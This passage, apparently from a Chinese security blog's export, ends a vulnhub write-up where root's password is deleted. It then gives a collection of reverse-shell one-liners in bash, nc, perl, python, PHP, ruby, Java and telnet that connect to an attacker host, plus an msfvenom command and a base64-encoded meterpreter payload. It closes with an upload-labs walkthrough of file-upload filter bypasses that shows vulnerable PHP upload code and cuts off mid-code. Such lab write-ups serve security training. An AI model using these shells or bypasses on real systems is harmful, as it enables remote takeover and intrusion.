alt="14"></p><p>由于没有安装sudo命令，所以我们在找到root.txt后，直接删除root的密码，然后就可以直接登录靶机了。</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> solidstate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2020/03/08/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2020/03/08/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<p>反弹shell的各种神奇姿势，做下收集</p><a id="more"></a><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="- Bash反弹shell"></a>- Bash反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">/bin/bash -c <span class="string">'/bin/bash&gt;/dev/tcp/attackerip/1234 0&gt;&amp;1 2&gt;&amp;1 &amp;'</span></span><br></pre></td></tr></table></figure><h2 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="- NC反弹shell"></a>- NC反弹shell</h2><p>nc的版本不同会导致弹不成功</p><p>可以-e的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 1234</span><br></pre></td></tr></table></figure><p>不能-e的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">/bin/sh | nc attackerip 4444</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/</span><br></pre></td></tr></table></figure><p>版本不一致：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h2 id="perl反弹shell"><a href="#perl反弹shell" class="headerlink" title="- perl反弹shell"></a>- perl反弹shell</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><p>不依赖于 / bin/sh 的 shell，更简短，并且不需要依赖/bin/sh</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><h2 id="Python反弹shell"><a href="#Python反弹shell" class="headerlink" title="- Python反弹shell"></a>- Python反弹shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line">python -c <span class="string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></span><br></pre></td></tr></table></figure><p>Metasploit版本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.90</span><span class="number">.1</span> LPORT=<span class="number">1234</span></span><br><span class="line"><span class="keyword">import</span> base64; exec(base64.b64decode(<span class="string">'aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='</span>))</span><br></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="- PHP"></a>- PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="- Ruby"></a>- Ruby</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure><p>不依赖bin/sh的shell：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")io|c.print io.readend'</span></span><br></pre></td></tr></table></figure><p>Windows 系统</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")io|c.print io.readend'</span></span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="- Java"></a>- Java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="- Telnet"></a>- Telnet</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p</span><br><span class="line">mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><p><strong>获取反弹shell后，可使用python获得交互式shell</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c<span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs-master</title>
      <link href="/2020/03/08/upload-labs-master/"/>
      <url>/2020/03/08/upload-labs-master/</url>
      
        <content type="html"><![CDATA[<p>upload-labs是一个专门练习文件上传漏洞的靶场</p><a id="more"></a><h1 id="upload-labs-master-靶场"><a href="#upload-labs-master-靶场" class="headerlink" title="- upload-labs-master 靶场"></a>- upload-labs-master 靶场</h1><h2 id="靶场总结"><a href="#靶场总结" class="headerlink" title="- 靶场总结"></a>- 靶场总结</h2><h3 id="1-靶机包含漏洞类型分类"><a href="#1-靶机包含漏洞类型分类" class="headerlink" title="1. 靶机包含漏洞类型分类"></a>1. 靶机包含漏洞类型分类</h3><p><img src="1.png" alt="1"></p><h3 id="2-如何判断上传漏洞类型"><a href="#2-如何判断上传漏洞类型" class="headerlink" title="2. 如何判断上传漏洞类型?"></a>2. 如何判断上传漏洞类型?</h3><p><img src="2.png" alt="2"></p><h2 id="upload-labs-write-up"><a href="#upload-labs-write-up" class="headerlink" title="- upload-labs write up"></a>- upload-labs write up</h2><h3 id="1-Pass-01（JS前端绕过）"><a href="#1-Pass-01（JS前端绕过）" class="headerlink" title="1. Pass-01（JS前端绕过）"></a>1. Pass-01（JS前端绕过）</h3><ul><li><p>分析：<br>首先打开<code>Burpsuite</code>和浏览器。然后上传一个1.php测试，发现burp还没抓包就报错了，所以是前端检查。然后F12查看源代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="actionscript">            alert(<span class="string">"请选择要上传的文件!"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">//定义允许上传的文件类型</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//提取上传文件的类型</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//判断上传文件类型是否允许上传</span></span></span><br><span class="line">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span></span><br><span class="line">            alert(errMsg);</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现只允许上传<code>&quot;.jpg|.png|.gif&quot;</code>三种类型的文件</p></li><li><p>绕过方法：<br>上传一个1.php.jpg文件，绕过前端的检测，然后再使用burp修改文件名即可。也可以是用浏览器禁用<code>js</code>然后进行上传。</p></li></ul><h3 id="2-Pass-02（Content-type绕过）"><a href="#2-Pass-02（Content-type绕过）" class="headerlink" title="2. Pass-02（Content-type绕过）"></a>2. Pass-02（Content-type绕过）</h3><ul><li>分析：<br>上传1.php，发现burp可以抓到包，所以没有前端检查，但是forward后，提示上传文件类型不正确，那么应该是Content-type检测</li><li>绕过方法：<br>上传时，用burp抓包，修改content-type的内容，把application/octet-stream（二进制流），改成可以上传的类型，比如image/gif就可以成功上传</li></ul><h3 id="3-Pass-03（黑名单绕过）"><a href="#3-Pass-03（黑名单绕过）" class="headerlink" title="3. Pass-03（黑名单绕过）"></a>3. Pass-03（黑名单绕过）</h3><ul><li><p>分析：<br>上传1.php，提示不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀文件，然后上传1.php.jpg可以成功上传。所以应该是服务器端进行了黑名单过滤，服务器源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>绕过方法：</p><ol><li><p>不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀文件，但是可以上传其他任意后缀。比如说:<code>.phtml .phps .php5 .pht</code>，但如果上传的是.php5这种类型文件的话，如果想要被当成<code>php</code>执行的话，需要有个前提条件，即Apache的<code>httpd.conf</code>有如下配置代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p>这串代码的意思是建立一个映射，将<code>.php .phtml .phps .php5 .pht</code>都当成PHP文件执行</p></li><li><p>这个黑名单并没有添加<code>.htaccess</code>后缀，故此处也可上传<code>.htaccess</code>文件进行绕过。<br>注：<code>htaccess</code>文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All。<code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在<code>httpd.conf</code>文件中配置。<br>构造<code>.htaccess</code>文件，内容如下:<code>AddType application/x-httpd-php .jpg</code><br>这里代码的意思可以让 .jpg后缀名文件格式的文件名以PHP格式解析，因此达到了可执行的效果。所以我们可以把要上传的PHP文件的后缀名改为.jpg格式从而绕过</p></li></ol></li></ul><h3 id="4-Pass-04（-htaccess绕过）"><a href="#4-Pass-04（-htaccess绕过）" class="headerlink" title="4. Pass-04（.htaccess绕过）"></a>4. Pass-04（<code>.htaccess</code>绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".ini"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题黑名单添加了很多变种后缀，而且仍然有小写转换，但本题的黑名单并没有<code>.htaccess</code></p></li><li><p>绕过：<br>所以可以使用上一题的第二种方法</p></li></ul><h3 id="5-Pass-05（windows命名规则点空格点绕过）"><a href="#5-Pass-05（windows命名规则点空格点绕过）" class="headerlink" title="5. Pass-05（windows命名规则点空格点绕过）"></a>5. Pass-05（windows命名规则点空格点绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题在上一题的基础上增加了<code>.htaccess</code>的黑名单，所有上一题的方法不能使用，但是此处可以利用windows的命名规则绕过:Windows下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点。</p></li><li><p>绕过：<br>由源码可知，对文件名会先删去收尾的点，进行黑名单比对前还会收尾去空，所以我们构造<code>xx.php. .</code>文件进行绕过</p></li></ul><h3 id="6-Pass-06（大小写绕过）"><a href="#6-Pass-06（大小写绕过）" class="headerlink" title="6. Pass-06（大小写绕过）"></a>6. Pass-06（大小写绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span 